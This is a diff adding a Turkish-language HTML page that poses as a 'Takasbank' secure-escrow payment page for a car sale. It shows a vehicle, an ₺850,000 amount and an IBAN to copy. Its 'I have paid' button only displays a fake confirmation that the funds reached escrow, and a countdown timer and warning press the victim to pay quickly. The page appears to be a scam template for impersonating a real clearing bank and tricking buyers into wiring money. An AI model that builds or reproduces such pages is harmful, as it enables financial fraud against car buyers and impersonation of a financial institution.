@@ -1,0 +1,336 @@
+
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Taşıt Takas - Güvenli Ödeme</title>
+  
+<style>
+  #countdown {
+    font-size: 1.4rem;
+    font-weight: bold;
+    background-color: #1d3765;
+    color: #ffffff;
+    border: 3px solid #facc15;
+    padding: 14px 20px;
+    border-radius: 16px;
+    text-align: center;
+    margin: 24px auto;
+    width: fit-content;
+    box-shadow: 0 0 16px rgba(0, 0, 0, 0.2);
+    transition: all 0.3s ease-in-out;
+  }
+
+    :root {
+      --primary-color: #1d3765;
+      --secondary-color: #f0f2f7;
+      --text-color: #333;
+    }
+
+    body {
+      margin: 0;
+      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+      background-color: var(--secondary-color);
+      color: var(--text-color);
+    }
+
+    .container {
+      max-width: 600px;
+      margin: 30px auto;
+      background-color: white;
+      border-radius: 8px;
+      padding: 25px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.08);
+    }
+
+    .logo {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+
+    .logo img {
+      width: 180px;
+      height: auto;
+    }
+
+    h1 {
+      text-align: center;
+      font-size: 22px;
+      margin-bottom: 25px;
+      color: var(--primary-color);
+    }
+
+    .section {
+      margin-bottom: 20px;
+    }
+
+    .label {
+      font-weight: 600;
+      color: var(--primary-color);
+    }
+
+    .value {
+      margin: 5px 0 10px 0;
+      padding: 10px;
+      background-color: var(--secondary-color);
+      border-radius: 6px;
+      word-break: break-word;
+    }
+
+    .copy-row {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+
+    .copy-btn {
+      background-color: var(--primary-color);
+      color: white;
+      border: none;
+      padding: 8px 12px;
+      border-radius: 6px;
+      font-size: 14px;
+      cursor: pointer;
+      margin-left: 10px;
+      white-space: nowrap;
+    }
+
+    button {
+      background-color: var(--primary-color);
+      color: white;
+      border: none;
+      padding: 14px 20px;
+      border-radius: 6px;
+      font-size: 16px;
+      cursor: pointer;
+      width: 100%;
+      margin-top: 15px;
+    }
+
+    button:disabled {
+      background-color: #aaa;
+      cursor: not-allowed;
+    }
+
+    .status {
+      margin-top: 15px;
+      font-weight: bold;
+      color: green;
+      text-align: center;
+    }
+
+    .info {
+      font-size: 13px;
+      color: #555;
+      margin-top: 30px;
+      border-top: 1px solid #ccc;
+      padding-top: 15px;
+      line-height: 1.5;
+    }
+
+    @media (max-width: 600px) {
+      .container {
+        margin: 15px;
+        padding: 15px;
+      }
+
+      h1 {
+        font-size: 18px;
+      }
+
+      .copy-row {
+        flex-direction: column;
+        align-items: stretch;
+      }
+
+      .copy-btn {
+        margin: 10px 0 0 0;
+        width: 100%;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="logo">
+      <img src="unnamed.jpg" alt="Taşıt Takas Logo" />
+    </div>
+
+    <h1>TaşıtTakas Güvenli Ödeme Bilgileri</h1>
+
+    <div class="section">
+      <div class="label">Araç:</div>
+      <div class="value">Fiat Egea 2022 1.6 Multijet Easy Plus</div>
+
+      
+<div class="label">Tarih:</div>
+<div class="value">27.07.2025</div>
+
+<div class="label">Plaka:</div>
+      <div class="value">35 CCY 531</div>
+
+      <div class="label">Ödenecek Tutar:</div>
+      <div class="value">₺850.000</div>
+
+      <div class="label">Takasbank IBAN:</div>
+      <div class="copy-row">
+        <div class="value" id="iban">TR45 0006 2000 1234 5678 9012 34</div>
+        <button class="copy-btn" onclick="copyText('iban')">Kopyala</button>
+      </div>
+
+      <div class="label">Takasbank Alıcı İsmi:</div>
+      <div class="copy-row">
+        <div class="value" id="adsoyad">TAKASBANK A.Ş. EMANET HESABI</div>
+        <button class="copy-btn" onclick="copyText('adsoyad')">Kopyala</button>
+      </div>
+
+      <div class="label">Durum:</div>
+      <div class="value" id="status">Ödeme Bekleniyor</div>
+    </div>
+
+    <button id="payBtn">Ödemeyi Yaptım</button>
+    <div class="status" id="finalStatus"></div>
+
+    <div class="info">
+      Bütün işlemler <strong>Takasbank güvencesi</strong> altında yapılmaktadır.
+    </div>
+  </div>
+
+  <script>
+    const payBtn = document.getElementById("payBtn");
+    const status = document.getElementById("status");
+    const finalStatus = document.getElementById("finalStatus");
+
+    payBtn.onclick = () => {
+      status.innerText = "Ödemeniz Takasbank emanet hesabına başarıyla iletilmiştir.";
+      finalStatus.innerText = "Takasbank tarafından ödeme doğrulama süreci başlatılmıştır. İşlem tamamlandığında her iki tarafa da bilgi verilecektir.";
+      payBtn.disabled = true;
+    };
+
+    function copyText(id) {
+      const text = document.getElementById(id).innerText;
+      navigator.clipboard.writeText(text).then(() => {
+        alert("Kopyalandı: " + text);
+      });
+    }
+  </script>
+
+
+
+<style>
+  #countdown {
+    font-size: 1.4rem;
+    font-weight: bold;
+    background-color: #1d3765;
+    color: #ffffff;
+    border: 3px solid #facc15;
+    padding: 14px 20px;
+    border-radius: 16px;
+    text-align: center;
+    margin: 24px auto;
+    width: fit-content;
+    box-shadow: 0 0 16px rgba(0, 0, 0, 0.2);
+    transition: all 0.3s ease-in-out;
+  }
+
+  .animated-warning {
+    background-color: #fef3c7;
+    border-left: 6px solid #facc15;
+    padding: 16px;
+    margin-top: 20px;
+    font-weight: bold;
+    font-size: 1rem;
+    color: #92400e;
+    animation: fadeinout 3s ease-in-out forwards;
+  }
+
+  @keyframes fadeinout {
+    0% { opacity: 0; }
+    10% { opacity: 1; }
+    90% { opacity: 1; }
+    100% { opacity: 0; }
+  }
+</style>
+
+<div class="animated-warning">
+  Belirtilen süre içinde bütün işlemlerinizi gerçekleştiriniz.
+</div>
+<script>
+  setTimeout(() => {
+    document.querySelector('.animated-warning').style.display = "none";
+  }, 3000);
+</script>
+
+
+
+<style>
+  #countdown {
+    font-size: 1.4rem;
+    font-weight: bold;
+    background-color: #1d3765;
+    color: #ffffff;
+    border: 3px solid #facc15;
+    padding: 14px 20px;
+    border-radius: 16px;
+    text-align: center;
+    margin: 24px auto;
+    width: fit-content;
+    box-shadow: 0 0 16px rgba(0, 0, 0, 0.2);
+    transition: all 0.3s ease-in-out;
+  }
+
+  #countdown {
+    font-size: 1.2rem;
+    font-weight: bold;
+    background-color: #e0f2fe;
+    color: #1e3a8a;
+    border: 2px dashed #60a5fa;
+    padding: 12px;
+    border-radius: 12px;
+    text-align: center;
+    margin: 20px 0;
+    box-shadow: 0 0 8px rgba(30, 58, 138, 0.1);
+  }
+</style>
+<div id="countdown"
+ style="margin-top: 20px; font-weight: bold; color: #1d3765;"></div>
+<script>
+  let mainTime = 120; // 2 dakika
+  let extraTime = 60; // 1 dakika ek süre
+  let isExtraTime = false;
+  const countdown = document.getElementById("countdown");
+
+  function updateCountdownDisplay(seconds) {
+    const mins = Math.floor(seconds / 60);
+    const secs = seconds % 60;
+    countdown.innerText = "Kalan Süre: " + mins + " dakika " + (secs < 10 ? "0" : "") + secs + " saniye";
+  }
+
+  function startCountdown(seconds) {
+    updateCountdownDisplay(seconds);
+    const timer = setInterval(() => {
+      seconds--;
+      updateCountdownDisplay(seconds);
+
+      if (seconds <= 0) {
+        clearInterval(timer);
+        if (!isExtraTime) {
+          isExtraTime = true;
+          alert("Ek süre: 1 dakika verildi.");
+          startCountdown(extraTime);
+        } else {
+          countdown.innerText = "Süre doldu. Sayfa kapanıyor...";
+          setTimeout(() => {
+            window.close();
+          }, 3000);
+        }
+      }
+    }, 1000);
+  }
+
+  startCountdown(mainTime);
+</script>
+
+</body>
+</html>
